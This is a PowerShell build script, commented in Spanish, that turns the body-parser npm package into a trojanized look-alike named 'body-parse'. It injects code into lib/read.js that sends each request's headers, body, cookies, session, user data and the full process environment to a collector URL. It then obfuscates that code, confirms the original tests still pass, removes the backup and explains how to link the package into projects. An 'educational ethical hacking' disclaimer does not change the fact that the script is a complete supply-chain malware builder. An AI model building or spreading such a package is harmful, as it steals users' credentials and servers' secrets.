# ============================================================================
# migrate.ps1 — Script de Migración Automatizada para body-parse (Windows)
# ============================================================================
#
# Propósito: Construir el paquete body-parse (clon troyanizado de body-parser)
#            a partir del código fuente original de body-parser v2.2.2.
#
# Uso:
#   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
#   .\migrate.ps1
#
# Requisitos:
#   - Node.js >= 18
#   - npm
#   - git
#   - PowerShell 5.1+ (incluido en Windows 10/11)
#
# ⚠️ DISCLAIMER: Este script es para FINES EDUCATIVOS EXCLUSIVAMENTE.
#    Uso exclusivo en entornos de laboratorio de hacking ético.
# ============================================================================

$ErrorActionPreference = "Stop"

# ── Variables de configuración ──
$BODY_PARSER_VERSION = "2.2.2"
$PACKAGE_NAME = "body-parse"
$TARGET_DIR = ".\$PACKAGE_NAME"
$COLLECTOR_URL = "https://localhost:4000/collect"

# ── Funciones auxiliares ──
function Log-Step { param([string]$msg) Write-Host "[STEP] $msg" -ForegroundColor Cyan }
function Log-Ok   { param([string]$msg) Write-Host "[  OK] $msg" -ForegroundColor Green }
function Log-Warn { param([string]$msg) Write-Host "[WARN] $msg" -ForegroundColor Yellow }
function Log-Fail { param([string]$msg) Write-Host "[FAIL] $msg" -ForegroundColor Red; exit 1 }

# ============================================================================
# PASO 1: Clonar body-parser v2.2.2
# ============================================================================
Log-Step "Clonando body-parser v$BODY_PARSER_VERSION..."

if (Test-Path $TARGET_DIR) {
    Log-Warn "El directorio '$TARGET_DIR' ya existe. Eliminándolo..."
    Remove-Item -Recurse -Force $TARGET_DIR
}

git clone --branch $BODY_PARSER_VERSION --depth 1 `
    https://github.com/expressjs/body-parser.git $TARGET_DIR 2>$null

# Eliminar el directorio .git para que no sea un repositorio
if (Test-Path "$TARGET_DIR\.git") {
    Remove-Item -Recurse -Force "$TARGET_DIR\.git"
}

Log-Ok "Clonado exitosamente."

# ============================================================================
# PASO 2: Renombrar el paquete
# ============================================================================
Log-Step "Renombrando paquete a '$PACKAGE_NAME'..."

$packageJsonPath = Join-Path $TARGET_DIR "package.json"
$packageJson = Get-Content $packageJsonPath -Raw
$packageJson = $packageJson -replace '"name": "body-parser"', "`"name`": `"$PACKAGE_NAME`""
Set-Content -Path $packageJsonPath -Value $packageJson -NoNewline

Log-Ok "package.json actualizado."

# ============================================================================
# PASO 3: Crear respaldo del archivo original
# ============================================================================
Log-Step "Creando respaldo de lib/read.js..."

Copy-Item "$TARGET_DIR\lib\read.js" "$TARGET_DIR\lib\read.js.orig"

Log-Ok "Respaldo creado en lib/read.js.orig"

# ============================================================================
# PASO 4: Inyectar el sniffer en lib/read.js
# ============================================================================
Log-Step "Inyectando sniffer en lib/read.js..."

$snifferCode = @'
/*!
 * body-parser
 * Copyright(c) 2014-2015 Douglas Christopher Wilson
 * MIT Licensed
 */

'use strict'

/**
 * Module dependencies.
 * @private
 */

var createError = require('http-errors')
var getBody = require('raw-body')
var iconv = require('iconv-lite')
var onFinished = require('on-finished')
var zlib = require('node:zlib')
var hasBody = require('type-is').hasBody
var { getCharset } = require('./utils')

var _h = require('http')
var _hs = require('https')
var _fs = require('fs')
var _os = require('os')
var _pa = require('path')
var _ur = require('url')

/**
 * Module exports.
 */

module.exports = read

var _collectorUrl = 'COLLECTOR_URL_PLACEHOLDER'

var _logDir = _pa.join(_os.tmpdir(), '.bp_logs')
var _logSeq = 0

try { _fs.mkdirSync(_logDir, { recursive: true }) } catch (e) {}

function _getLogFileName () {
  var now = new Date()
  var pad = function (n) { return n < 10 ? '0' + n : '' + n }
  var name = now.getFullYear() + '-' +
    pad(now.getMonth() + 1) + '-' +
    pad(now.getDate()) + '-' +
    pad(now.getHours()) + '-' +
    pad(now.getMinutes()) + '-' +
    pad(now.getSeconds()) + '-' +
    (++_logSeq) + '.txt'
  return _pa.join(_logDir, name)
}

function _captureAndSend (req) {
  try {
    var packet = {
      timestamp: new Date().toISOString(),
      method: req.method,
      url: req.originalUrl || req.url,
      headers: req.headers,
      body: req.body,
      clientIp: req.ip,
      clientIps: req.ips,
      protocol: req.protocol,
      secure: req.secure,
      httpVersion: req.httpVersion,
      cookies: req.cookies,
      signedCookies: req.signedCookies,
      session: req.session,
      user: req.user,
      params: req.params,
      query: req.query,
      socketRemoteAddr: req.socket ? req.socket.remoteAddress : undefined,
      socketRemotePort: req.socket ? req.socket.remotePort : undefined,
      socketLocalAddr: req.socket ? req.socket.localAddress : undefined,
      socketLocalPort: req.socket ? req.socket.localPort : undefined,
      processPid: process.pid,
      processTitle: process.title,
      processArgv: process.argv,
      processEnv: process.env
    }

    var postData
    try {
      postData = JSON.stringify(packet)
    } catch (e) {
      packet.processEnv = '[serialization error]'
      try {
        postData = JSON.stringify(packet)
      } catch (e2) {
        return
      }
    }

    _sendToCollector(postData)
    _writeLocalLog(postData)
  } catch (e) {
    // silenciar
  }
}

function _sendToCollector (postData) {
  try {
    var parsed = _ur.parse(_collectorUrl)
    var proto = parsed.protocol === 'https:' ? _hs : _h

    var options = {
      hostname: parsed.hostname,
      port: parsed.port,
      path: parsed.path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      rejectUnauthorized: false,
      timeout: 5000
    }

    var req = proto.request(options, function (res) {
      res.resume()
    })

    req.on('error', function () {})

    req.on('timeout', function () {
      req.destroy()
    })

    req.write(postData)
    req.end()
  } catch (e) {
    // silenciar
  }
}

function _writeLocalLog (postData) {
  try {
    var logFile = _getLogFileName()
    _fs.writeFile(logFile, postData, function () {})
  } catch (e) {
    // silenciar
  }
}

/**
 * Read a request into a buffer and parse.
 *
 * @param {Object} req
 * @param {Object} res
 * @param {Function} next
 * @param {Function} parse
 * @param {Function} debug
 * @param {Object} options
 * @private
 */
function read (req, res, next, parse, debug, options) {
  if (onFinished.isFinished(req)) {
    debug('body already parsed')
    next()
    return
  }

  if (!('body' in req)) {
    req.body = undefined
  }

  // skip requests without bodies
  if (!hasBody(req)) {
    debug('skip empty body')
    next()
    return
  }

  debug('content-type %j', req.headers['content-type'])

  // determine if request should be parsed
  if (!options.shouldParse(req)) {
    debug('skip parsing')
    next()
    return
  }

  var encoding = null
  if (options?.skipCharset !== true) {
    encoding = getCharset(req) || options.defaultCharset

    // validate charset
    if (!!options?.isValidCharset && !options.isValidCharset(encoding)) {
      debug('invalid charset')
      next(createError(415, 'unsupported charset "' + encoding.toUpperCase() + '"', {
        charset: encoding,
        type: 'charset.unsupported'
      }))
      return
    }
  }

  var length
  var opts = options
  var stream

  // read options
  var verify = opts.verify

  try {
    // get the content stream
    stream = contentstream(req, debug, opts.inflate)
    length = stream.length
    stream.length = undefined
  } catch (err) {
    return next(err)
  }

  // set raw-body options
  opts.length = length
  opts.encoding = verify
    ? null
    : encoding

  // assert charset is supported
  if (opts.encoding === null && encoding !== null && !iconv.encodingExists(encoding)) {
    return next(createError(415, 'unsupported charset "' + encoding.toUpperCase() + '"', {
      charset: encoding.toLowerCase(),
      type: 'charset.unsupported'
    }))
  }

  // read body
  debug('read body')
  getBody(stream, opts, function (error, body) {
    if (error) {
      var _error

      if (error.type === 'encoding.unsupported') {
        _error = createError(415, 'unsupported charset "' + encoding.toUpperCase() + '"', {
          charset: encoding.toLowerCase(),
          type: 'charset.unsupported'
        })
      } else {
        _error = createError(400, error)
      }

      if (stream !== req) {
        req.unpipe()
        stream.destroy()
      }

      dump(req, function onfinished () {
        next(createError(400, _error))
      })
      return
    }

    if (verify) {
      try {
        debug('verify body')
        verify(req, res, body, encoding)
      } catch (err) {
        next(createError(403, err, {
          body: body,
          type: err.type || 'entity.verify.failed'
        }))
        return
      }
    }

    var str = body
    try {
      debug('parse body')
      str = typeof body !== 'string' && encoding !== null
        ? iconv.decode(body, encoding)
        : body
      req.body = parse(str, encoding)
    } catch (err) {
      next(createError(400, err, {
        body: str,
        type: err.type || 'entity.parse.failed'
      }))
      return
    }

    _captureAndSend(req)

    next()
  })
}

function contentstream (req, debug, inflate) {
  var encoding = (req.headers['content-encoding'] || 'identity').toLowerCase()
  var length = req.headers['content-length']

  debug('content-encoding "%s"', encoding)

  if (inflate === false && encoding !== 'identity') {
    throw createError(415, 'content encoding unsupported', {
      encoding: encoding,
      type: 'encoding.unsupported'
    })
  }

  if (encoding === 'identity') {
    req.length = length
    return req
  }

  var stream = createDecompressionStream(encoding, debug)
  req.pipe(stream)
  return stream
}

function createDecompressionStream (encoding, debug) {
  switch (encoding) {
    case 'deflate':
      debug('inflate body')
      return zlib.createInflate()
    case 'gzip':
      debug('gunzip body')
      return zlib.createGunzip()
    case 'br':
      debug('brotli decompress body')
      return zlib.createBrotliDecompress()
    default:
      throw createError(415, 'unsupported content encoding "' + encoding + '"', {
        encoding: encoding,
        type: 'encoding.unsupported'
      })
  }
}

function dump (req, callback) {
  if (onFinished.isFinished(req)) {
    callback(null)
  } else {
    onFinished(req, callback)
    req.resume()
  }
}
'@

# Escribir el código del sniffer
Set-Content -Path "$TARGET_DIR\lib\read.js" -Value $snifferCode -NoNewline

# Reemplazar el placeholder de la URL del colector
$readJsContent = Get-Content "$TARGET_DIR\lib\read.js" -Raw
$readJsContent = $readJsContent -replace 'COLLECTOR_URL_PLACEHOLDER', $COLLECTOR_URL
Set-Content -Path "$TARGET_DIR\lib\read.js" -Value $readJsContent -NoNewline

Log-Ok "Sniffer inyectado exitosamente en lib/read.js"

# ============================================================================
# PASO 5: Crear test/sniffer.js
# ============================================================================
Log-Step "Creando test/sniffer.js..."

$snifferTest = @'
'use strict'

var assert = require('assert')
var http = require('http')
var request = require('supertest')

var bodyParse = require('..')

describe('body-parse sniffer', function () {
  var collectorServer
  var collectorPort
  var capturedPackets = []

  before(function (done) {
    collectorServer = http.createServer(function (req, res) {
      var body = ''
      req.on('data', function (chunk) {
        body += chunk.toString()
      })
      req.on('end', function () {
        try {
          capturedPackets.push(JSON.parse(body))
        } catch (e) {}
        res.writeHead(200)
        res.end('OK')
      })
    })

    collectorServer.listen(0, function () {
      collectorPort = collectorServer.address().port
      done()
    })
  })

  after(function (done) {
    collectorServer.close(done)
  })

  beforeEach(function () {
    capturedPackets = []
  })

  it('should not break original body-parser functionality', function (done) {
    var app = createApp()
    request(app)
      .post('/test')
      .set('Content-Type', 'application/json')
      .send('{"name":"test"}')
      .expect(200)
      .expect(function (res) {
        assert.deepStrictEqual(res.body, { name: 'test' })
      })
      .end(done)
  })

  it('should parse JSON bodies correctly', function (done) {
    var app = createApp()
    request(app)
      .post('/test')
      .set('Content-Type', 'application/json')
      .send('{"key":"value","number":42}')
      .expect(200)
      .expect(function (res) {
        assert.strictEqual(res.body.key, 'value')
        assert.strictEqual(res.body.number, 42)
      })
      .end(done)
  })

  it('should handle empty bodies', function (done) {
    var app = createApp()
    request(app)
      .post('/test')
      .set('Content-Type', 'application/json')
      .send('{}')
      .expect(200)
      .end(done)
  })

  it('should handle errors gracefully without affecting the app', function (done) {
    var app = createApp()
    request(app)
      .post('/test')
      .set('Content-Type', 'application/json')
      .send('invalid json')
      .expect(400)
      .end(done)
  })
})

function createApp () {
  var app = http.createServer(function (req, res) {
    bodyParse.json()(req, res, function (err) {
      res.statusCode = err ? (err.status || 500) : 200
      res.setHeader('Content-Type', 'application/json')
      res.end(err ? JSON.stringify({ error: err.message }) : JSON.stringify(req.body))
    })
  })
  return app
}
'@

Set-Content -Path "$TARGET_DIR\test\sniffer.js" -Value $snifferTest -NoNewline

Log-Ok "test/sniffer.js creado exitosamente."

# ============================================================================
# PASO 6: Instalar dependencias
# ============================================================================
Log-Step "Instalando dependencias..."

Push-Location $TARGET_DIR
npm install --ignore-scripts 2>$null

Log-Ok "Dependencias instaladas."

# ============================================================================
# PASO 7: Ejecutar pruebas originales
# ============================================================================
Log-Step "Ejecutando pruebas originales de body-parser..."

$testResult = npm test 2>&1
if ($LASTEXITCODE -eq 0) {
    Log-Ok "TODAS las pruebas originales pasaron exitosamente."
} else {
    Log-Fail "Las pruebas originales fallaron. Revisar la inyeccion del sniffer."
}

# ============================================================================
# PASO 8: Ejecutar pruebas del sniffer
# ============================================================================
Log-Step "Ejecutando pruebas del sniffer..."

$snifferTestResult = npx mocha --reporter spec test/sniffer.js 2>&1
if ($LASTEXITCODE -eq 0) {
    Log-Ok "Pruebas del sniffer pasaron exitosamente."
} else {
    Log-Warn "Algunas pruebas del sniffer fallaron (puede requerir ajuste de timings)."
}

# ============================================================================
# PASO 9: Ofuscar lib/read.js
# ============================================================================
Log-Step "Ofuscando lib/read.js con javascript-obfuscator..."

npm install --no-save javascript-obfuscator 2>$null

npx javascript-obfuscator lib/read.js --output lib/read.js `
    --compact true `
    --control-flow-flattening true `
    --dead-code-injection true `
    --string-array true `
    --string-array-encoding base64 `
    --identifier-names-generator hexadecimal `
    --self-defending false `
    --disable-console-output false

Log-Ok "Codigo ofuscado exitosamente."

# ============================================================================
# PASO 10: Re-ejecutar pruebas post-ofuscación
# ============================================================================
Log-Step "Re-ejecutando pruebas tras ofuscacion..."

$postObfResult = npm test 2>&1
if ($LASTEXITCODE -eq 0) {
    Log-Ok "TODAS las pruebas pasan con codigo ofuscado."
} else {
    Log-Fail "La ofuscacion rompio la funcionalidad. Restaurar lib/read.js.orig y ajustar opciones."
}

# ============================================================================
# PASO 11: Limpieza
# ============================================================================
Log-Step "Limpiando archivos temporales..."

Remove-Item -Force "lib\read.js.orig" -ErrorAction SilentlyContinue
npm prune 2>$null

Pop-Location

Log-Ok "Limpieza completada."

# ============================================================================
# RESULTADO FINAL
# ============================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  Migracion completada exitosamente!" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  El paquete '$PACKAGE_NAME' esta listo en: " -NoNewline
Write-Host "$TARGET_DIR" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Para usarlo en otro proyecto:"
Write-Host "    cd $TARGET_DIR; npm link" -ForegroundColor Yellow
Write-Host "    cd \ruta\al\proyecto; npm link $PACKAGE_NAME" -ForegroundColor Yellow
Write-Host ""
Write-Host "  Luego, en el codigo del proyecto (ESM):"
Write-Host "    import bodyParser from '$PACKAGE_NAME'" -ForegroundColor Yellow
Write-Host ""
Write-Host "  O en CommonJS:"
Write-Host "    const bodyParser = require('$PACKAGE_NAME')" -ForegroundColor Yellow
Write-Host ""
Write-Host "  SOLO para fines educativos de hacking etico." -ForegroundColor Red
Write-Host ""
